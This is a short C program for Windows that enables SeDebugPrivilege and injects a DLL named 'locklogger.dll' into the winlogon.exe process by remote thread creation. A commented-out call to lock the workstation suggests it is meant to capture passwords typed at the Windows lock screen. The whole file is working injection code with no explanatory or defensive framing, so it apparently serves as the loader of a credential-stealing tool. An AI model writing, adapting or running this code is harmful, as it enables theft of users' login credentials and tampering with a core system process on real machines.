#include <Windows.h>
#include <stdio.h>

#include "priv.h"
#include "process.h"

BOOL winlogon_inject(const char *szDll)
{
	BOOL ret = FALSE;

	SIZE_T dwWritten = 0;
	DWORD dwThreadId;

	HANDLE hProc = find_process("winlogon.exe");

	if (hProc == INVALID_HANDLE_VALUE)
		return FALSE;

	do
	{

		PVOID pRemoteString = VirtualAllocEx(hProc, 0, 0x1000, MEM_COMMIT, PAGE_READWRITE);

		if (!pRemoteString)
			break;

		if (!WriteProcessMemory(hProc, pRemoteString, szDll, strlen(szDll) + 1, &dwWritten))
			break;

		HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)&LoadLibraryA, pRemoteString, 0, &dwThreadId);

		if (!hThread)
			break;

		ret = TRUE;
	} while (0);

	CloseHandle(hProc);

	return ret;
}

int main()
{
	const char szDllPath[MAX_PATH] = { 0 };
	const char *szDllName = "\\locklogger.dll";

	GetCurrentDirectoryA(sizeof(szDllPath), szDllPath);
	strcat_s(szDllPath, sizeof(szDllPath), szDllName);

	printf("DLL: %s\n", szDllPath);
	printf("SeDebugPriv: %d\n", get_debug_priv());

	if (winlogon_inject(szDllPath))
	{
		printf("Injection should have worked...\n");
		//LockWorkStation();
	}
	else
	{
		printf("Injection failed: %d\n", GetLastError());
	}

	return 0;
}